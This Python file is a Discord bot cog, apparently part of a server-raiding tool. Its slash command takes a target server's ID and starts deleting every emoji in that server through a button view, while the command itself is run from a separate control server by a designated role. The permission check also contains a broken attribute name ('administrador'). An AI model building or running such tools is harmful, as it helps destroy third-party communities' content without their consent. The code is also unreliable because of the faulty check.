import datetime

import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Interaction, SlashOption, Embed, Color

from config.config_handler import ConfigHandler
from middlewares.server_verification import ServerVerification
from components.buttons.emoji_button import EmojisButtons
from utils.server_utils import ServerUtils

class Demojis(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "demojis",
        description = "Elimina todos los emojis que pueda.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def demojis_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        self.verifications.check_bag(guild)
        
        if (not guild.me.guild_permissions.manage_emojis
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["1073741824"])
        
        start_embed = Embed(
            title = "✅ |Da clic en el botón con '🚀' para iniciar la acción.",
            timestamp = datetime.datetime.now(),
            color = Color.blurple())
        
        view = EmojisButtons(guild)
        await ctx.response.send_message(embed = start_embed, view = view)
        
def setup(client):
    client.add_cog(Demojis(client))